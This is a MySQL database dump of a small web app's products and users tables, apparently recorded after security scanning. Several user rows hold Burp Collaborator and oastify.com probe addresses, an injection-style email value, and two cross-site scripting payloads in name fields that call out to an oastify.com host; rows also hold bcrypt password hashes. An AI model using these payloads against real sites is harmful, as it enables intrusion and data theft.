-- MySQL dump 10.13  Distrib 8.0.40, for Win64 (x86_64)
--
-- Host: 127.0.0.1    Database: yasserdb
-- ------------------------------------------------------
-- Server version	5.7.44

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `products`
--

DROP TABLE IF EXISTS `products`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `products` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL,
  `price` decimal(10,2) NOT NULL,
  `image` varchar(255) DEFAULT NULL,
  `imageUrl` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `products`
--

LOCK TABLES `products` WRITE;
/*!40000 ALTER TABLE `products` DISABLE KEYS */;
/*!40000 ALTER TABLE `products` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `reset_token` varchar(255) DEFAULT NULL,
  `reset_token_expiration` bigint(20) DEFAULT NULL,
  `profile_image` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `email` (`email`)
) ENGINE=InnoDB AUTO_INCREMENT=966 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (29,'wdqwd','@34324','$2b$10$NVj3juyD1XRQrNnxzsirLujdNE0tMc3dTvcjha1gzOwIlEH4HkkO.','2024-10-25 17:58:06',NULL,NULL,'1729879086218-734252.jpg'),(30,'e2e2','@efe','$2b$10$iecLH2O/PLsSYRHtH1SP0OjczII/dGU88/BdEjyIbKa4wZqSa4MRu','2024-10-25 17:58:19',NULL,NULL,'1729879099531-wallpaper_1672381553b98427afb542d17bf79840bfb973dc73.jpeg'),(32,'dqw','dqwd','$2b$10$WZsBYHVDTR5M46FUJR4pFO8WhV2CsHKlOD8OigDX/Ltd40ZHoDUV6','2024-10-25 18:35:51',NULL,NULL,'1729881351189-315948.jpg'),(33,'dqwd','dwqd','$2b$10$divVylAid97wKeoa4KeLQeQIkW/lnQu1KGC7qZfKS2lLFpHv4ak.2','2024-10-25 18:36:05',NULL,NULL,'1729881365801-cyber-threat1.jpg'),(35,'dqwd','dqwd!@','$2b$10$IxR7acs6egPyoXo5w9cg4OdSHimlRMYvPKeHcuPXrj13Jmn7csnTC','2024-10-25 18:36:22',NULL,NULL,'1729881382594-cyber-threat1.jpg'),(36,'dqwd','dqwd@','$2b$10$6cugpEFgu05dggwC1bxkVeYH1IFsUeL7un4e0frvxMdv/HO0WAS3S','2024-10-25 18:36:35',NULL,NULL,'1729881395762-315824.jpg'),(37,'qdwd','dqwd@@','$2b$10$nZHQ0MdjDfzcYP7lJCVECO9R5bxen7ovPQVQVI7yDpLIeZV/ctwIe','2024-10-25 18:36:48',NULL,NULL,'1729881408267-734252.jpg'),(38,'dqwdw','dqwd@@@@@','$2b$10$uTWjsOUt0a9uC0iddXSGaOmsBiETl02WIwGXj6v.0pvkRGsxCVwAO','2024-10-25 18:37:06',NULL,NULL,'1729881426055-wallpaper_1672381553b98427afb542d17bf79840bfb973dc73.jpeg'),(39,'dqwdqwd','dqwdqwd!!!','$2b$10$TKDJHptKaRb8e2QjXQ9Cheqffqwi9RIjpMhnFbx/Hzdj4sCFHk0Pm','2024-10-25 18:37:20',NULL,NULL,'1729881440890-112327(1).jpg'),(40,'dqwdqwdwqd','dqwdqwdw!@@@','$2b$10$o2sOG7fCziT2TSikygoX2ex6WnpwqZ2YdybBCbozDAuqkTK5OCUx2','2024-10-25 18:37:33',NULL,NULL,'1729881453793-112327(1).jpg'),(41,'qdqwdwdqwd','dqwdqwfqwf!@','$2b$10$GUIL7Nsmw7uD6mPLoyf03OzQfZcsUcIcMQAYIRCzRGq3JQd.BkwWO','2024-10-25 18:37:47',NULL,NULL,'1729881467303-cyber-threat1.jpg'),(42,'dwdwqdqw','feq@@@','$2b$10$NYwbdzkIYw9lxsHH04ohN.qeOf47xDEKr8xfpn5YSY.gW0CQ8xMLG','2024-10-25 20:07:30',NULL,NULL,'1729886850768-wallpaper_15590048615cec86bd6954b.jpg'),(43,'ahmedali2','ahmedali2@gmail.com','$2b$10$Q8Xs2jx7cqhAX8JWD4lppe4u3mCiqsByDRJfuTw1yhV.hkCPU3Ndq','2024-11-23 07:58:35',NULL,NULL,'1732348762702-172290-MSI-G-Dragon-748x418.jpg'),(44,'d3d23','d23f32f@yahoo.com','$2b$10$D4JkJNaUVDzndn0viVVzReg8fdrf/3fd9jVK6PrM/r0J/HiwS0uH2','2024-11-23 08:46:47',NULL,NULL,NULL),(45,'intruder','intruder1@email.com','$2b$10$Otq5D7FdoxBpd17WwUzBzePSBmuwhqrL6KIlzRQ4zVuaYCKKKrH16','2024-11-23 20:04:42',NULL,NULL,'1732392282441-maxresdefault.jpg'),(47,'intruder','intruder2@email.com','$2b$10$RKUbRs6HrV5esi0UFZMQlOz0stm0fOxgIsMlp2RA16V2LqGDkasLW','2024-11-23 20:05:08',NULL,NULL,'1732392308588-maxresdefault.jpg'),(49,'intruder','intruder3@email.com','$2b$10$WaGVk5/hwXfeI7rCdfQIBO1gUQQl.Bj6m3xhs4ldlpTVsG4cFcjly','2024-11-23 20:05:35',NULL,NULL,'1732392335327-maxresdefault.jpg'),(51,'intruder','intruder4@email.com','$2b$10$Y245iDKh3wG0ZVcOXiCRLOuhdW/ncI.Ah5x9.O2QI6DpBvjOrOBJW','2024-11-23 20:11:19',NULL,NULL,'1732392679359-maxresdefault.jpg'),(53,'intruder','intruder5@email.com','$2b$10$9RCDeBBexVSzHrIHHPnQveXEkPhF2tqwB0j0OFonya55fjL2on8By','2024-11-23 20:17:24',NULL,NULL,'1732393044121-maxresdefault.jpg'),(54,'intruder','intruder%7bbase%7d\'%7c%7c\'@email.com','$2b$10$P2IwWg.I0V9HKWJu4ukP8uf6IRkxuehnvlX0BWfbOQTk6j1HJit1e','2024-11-23 20:18:20',NULL,NULL,'1732393100613-maxresdefault.jpg'),(56,'dqwdw','dqwdw@yahoo.com','$2b$10$fEqblCB8jxsYfQjAX4QHz.emkXSKVcEghzz.X7QAISxCEhJGoTYSG','2024-11-23 20:33:21',NULL,NULL,NULL),(57,'dqwdqwd','dqwdwq@yahoo.com','$2b$10$hYuqzL3zCfRpzTuO4NaCFe7TcXp2QHwGRC2YnsgtPt7SIjK7adVGC','2024-11-23 20:35:46',NULL,NULL,'1732394146169-wdwdwd.jfif'),(59,'dqwdqwd','dqwdwq1@yahoo.com','$2b$10$04aWleUb33xROnJdlUS2H.PmJVhLXeaZVimmTsnXMzWym2vxX4hBS','2024-11-23 20:36:14',NULL,NULL,'1732394174268-wdwdwd.jfif'),(60,'dwed','dwytrtyutre@yahoo.com','$2b$10$mIw1Cdg8sOINte508kfxZOWZPOsrTHwG0A6YtUlqkP4X682Dk06mK','2024-11-23 20:40:58',NULL,NULL,NULL),(62,'intruder','intruder%7bbase%7d\'%7c%7c\'@4123email.com','$2b$10$TKX8SuA/22ecLFDyI4XqGOiWjPvWVl7QLMYlMPXXe4UyzTwzrRLSO','2024-11-24 00:30:26',NULL,NULL,'1732408226795-maxresdefault.jpg'),(63,'intruder','intruder96564@email.com','$2b$10$N5nZWZR35qd2kCc6KH.Y9.uG4XQKp08jKrIThGAyCpUyfIqWL1VGa','2024-11-24 00:31:09',NULL,NULL,'http://localhost:3000/uploads/1732408269649-maxresdefault.jpg'),(64,'FZfjNWDt','WelaFNzT@burpcollaborator.net','$2b$10$zZI4DFGVnpo0gJvSGZxLwOwVfUSbINMu9Q2FKyJhkFnxvHdYna18S','2024-11-25 13:41:23',NULL,NULL,NULL),(65,'AOsSNhFm','FueuycWP@burpcollaborator.net','$2b$10$1Z2pBbX0BbBicc2rjjw3e.W1482DSTfBfUN0Yl4VGQ4pUhj.hJDL6','2024-11-25 13:44:14',NULL,NULL,NULL),(66,'CyknlIeN','brlDZwbo@burpcollaborator.net','$2b$10$otMa..51XAI6HTgIiNj/B.KFGCELfgKnouKg6HY2j2lyvjRn8UFSO','2024-11-25 13:47:09',NULL,NULL,NULL),(68,'CnOwjtHz','FXmsMAuN@burpcollaborator.net','$2b$10$TKlGreW7hedNkPvhISYZNeNQyEV3WR7p3KlY8dOz6qPqCzvaWMIaK','2024-11-25 13:48:37',NULL,NULL,NULL),(69,'JUcgVwFd','DGrWgsht@burpcollaborator.net','$2b$10$SpQihAwN1sqAeKjfbwun3ehRcyru6m2O5sq7VUQCsZXMnhQ8tvfIG','2024-11-25 13:53:15',NULL,NULL,NULL),(70,'\'\"><svg/onload=fetch`//6ryr33f6mi2itrbo4dpmlzlw4naia60uskgc32rr\\.oastify.com`>','ligRlsKE@burpcollaborator.net','$2b$10$2Rx.6LeY2t1T9Jk7hCBC9ezYVSkHetGvMKdCSsY3.vj7gkHpLUe/.','2024-11-25 13:54:51',NULL,NULL,NULL),(71,'javascript:/*</script><img/onerror=\'-/\"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/1hjmty51cdsdjm1ju8fhbubrui0d01qpig68tyhnX;.oastify.com/).replace(/.;/g,[])]//\'src=>','ZdIpIkGB@burpcollaborator.net','$2b$10$bwElLfT.Lgh3a8uy7sqoSuElnRn7DgL2HDN.jX0XrJQmDC3Bx2Zwe','2024-11-25 13:56:22',NULL,NULL,NULL),(72,'ZWcBUvUD','mvwFSeLb@burpcollaborator.net','$2b$10$vu7CuJBiY39s1nLkf/GgZuCxbdiIFlQlsrSv5GxSgCwjXtK34UeWK','2024-11-25 13:57:52',NULL,NULL,NULL),(73,'HkvAWOtB','aqXfnCQi@burpcollaborator.net','$2b$10$cAUK1N2K9yeUJCfKh.hYOO29Vv2w7CEr9CuG7sewJS5BuZt6pYrwC','2024-11-25 14:02:09',NULL,NULL,NULL),(74,'BsMXDpce','RUjEUQkL@burpcollaborator.net','$2b$10$Ja0w7e.xihFdvV5KohOno.vaFGmikf.LH5NbQFms2FyIVRXspNrNG','2024-11-25 14:02:53',NULL,NULL,NULL),(75,'rCwAPlVx','kmrJEoeX@burpcollaborator.net','$2b$10$23fPphceCHuaSlTMYqeHleJNAx3mQ6I1FjR2aA05WUFzFm6xYl8ou','2024-11-25 14:03:35',NULL,NULL,NULL),(76,'VjYOrYHA','FKsqSXSk@burpcollaborator.net','$2b$10$cobbgZs7s3a9R8fXVd6Ih..xXVq40QhWXf4pXvI4fkXJFPTRZsFR6','2024-11-25 14:04:20',NULL,NULL,NULL),(77,'HCFvaXVJ','cBntRvRT@burpcollaborator.net','$2b$10$VSelBqNyvBGkPLCM4INZ8eb3Ym1o6OfG6u6DZN4YKpDlsVBN1CNha','2024-11-25 14:05:03',NULL,NULL,NULL),(78,'rMWkeqSx','yfWTHMKG@burpcollaborator.net','$2b$10$wDcoglKCVfmmEfUk5xfcIuKijiP50/tLHJBFHmFTsuY0Zm0dzY286','2024-11-25 14:05:45',NULL,NULL,NULL),(79,'MpxzPfqG','XcbTxslK@burpcollaborator.net','$2b$10$XnNJuyywWjoVnjLZQ6C1Y.XEFLkxeGAU3GBdO5/iakzA8u4KPUO6W','2024-11-25 14:06:27',NULL,NULL,NULL),(80,'FkvStwPi','BZxyGOeX@burpcollaborator.net','$2b$10$Ez1rOpywdK9Ib5mTh2lR4uHxp2BN1CBQWrg.E1q4liUlUsv5QFGki','2024-11-25 14:07:10',NULL,NULL,NULL),(81,'KRyzhiMF','CkDHBhTA@burpcollaborator.net','$2b$10$IQ.HQ8B6oz/Q.y51lZL9pOuWoxOsm2Ln.8.x4RrCwGBFsM8ArOk3y','2024-11-25 14:07:52',NULL,NULL,NULL),(82,'eFBEYeDJ','YsXBGSXV@burpcollaborator.net','$2b$10$fGL8Wt6ZF3ZM/w/2KI95SunZPSIOjZk0BRre0zxc4y2DOoye8K8U6','2024-11-25 14:08:35',NULL,NULL,NULL),(83,'zrXiXcqa','omHSDWmj@burpcollaborator.net','$2b$10$HF2LluAmzbBJAO7.yE/sCudE9aoKf4ipfRxHvZ79m2k83wRfqGcWC','2024-11-25 14:09:18',NULL,NULL,NULL),(84,'akoyoUkJ','dOPRxXUp@burpcollaborator.net','$2b$10$Y22.xcbnbgXh2iss8ptK0u/s/t.S0G7in5ISFapmbwpXebvqhF3ay','2024-11-25 14:10:00',NULL,NULL,NULL),(85,'gUDiyclv','iTCawIcS@burpcollaborator.net','$2b$10$uys4wzlr29DVzNBiLhx.HewerFIxhLLlkGGYdia6D82TekPzjp5ci','2024-11-25 14:10:45',NULL,NULL,NULL),(86,'vrmlQThR','HoiLrDaK@burpcollaborator.net','$2b$10$.Bn8ziwmEjJzgmNveuIciuaFTBk8EOiJY/tlTo.vbbmAboe8mJWfi','2024-11-25 14:13:02',NULL,NULL,NULL),(87,'sMzRXotA','nHEFSEcq@burpcollaborator.net','$2b$10$k0bgUVpdiYWcYObFwITbVeAZPRG01mt8t0mmBCV/5wxlEvxarOFaa','2024-11-25 14:15:07',NULL,NULL,NULL),(88,'sxVbmLLa','KBvKoZpo@burpcollaborator.net','$2b$10$wfzqZGGE30TuU3/NO65pqOvIVmPKvENiGRptfXRSO7R77DtDKUs8W','2024-11-27 12:51:10',NULL,NULL,NULL),(89,'lnhgSVvJ','TfQAfiRn@burpcollaborator.net','$2b$10$yLjG3M543ML8aCXixN2stuWQJB6sHbExVg1AH.Yy91wLBBYwI5FJO','2024-11-27 12:51:14',NULL,NULL,NULL),(90,'qAxVpYQL','qAxVpYQL@burpcollaborator.net','$2b$10$nZ9U1ShPXM/wiNlmTpUGk.MJ54CrP2JvQPn/9ltvWhscHcz6riLue','2024-11-27 12:51:15',NULL,NULL,NULL),(378,'qAxVpYQL','jys/qAxVpYQL@burpcollaborator.net','$2b$10$GyK.aeuU7w31kmrLxYeXQu/jShi5pScm.0jcfKsQUuZI1SytJtDMC','2024-11-27 12:53:45',NULL,NULL,NULL),(385,'qAxVpYQL','axb2k5yjtmhe8f97u295lwnqzh5at0hscg43vrk@oastify.com','$2b$10$045Iq.WEPqxiu0y53zbRg.Wd53yc1B8MAr1PNz/hdy7qP3A.Kq.2O','2024-11-27 12:53:46',NULL,NULL,NULL),(962,'wdqwdw','dqwdqwd@email.com','$2b$10$RSEKOJTNJBQABIwfUPawVucpw0Nv60cy1g4KbDlGeF66jrjPZ9z3O','2024-11-27 12:57:21',NULL,NULL,NULL),(963,'jwebhewlfj','yasyas@yahoo.com','$2b$10$tw956kmawuCyikAaY8gfSesQqlRDq2SGNM8bXW9wsAOpp/P/jAcPa','2024-12-03 08:23:47',NULL,NULL,NULL),(964,'yasser dhia','yasser@yahoo.com','$2b$10$vF4TkQLG8wzJxG6oohFNg.kWBWQRap/80QwtNyi8TMiZK1ypvkTIq','2024-12-03 08:25:54',NULL,NULL,NULL),(965,'yasser dhia','yasserchange@yahoo.com','$2b$10$M6ZvWwmXVOHogynmGVdpZeIpd9cwKSHkGrKGC4JEmwu4ECC.S3NIi','2024-12-03 08:38:26',NULL,NULL,NULL);
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2024-12-14 15:50:02
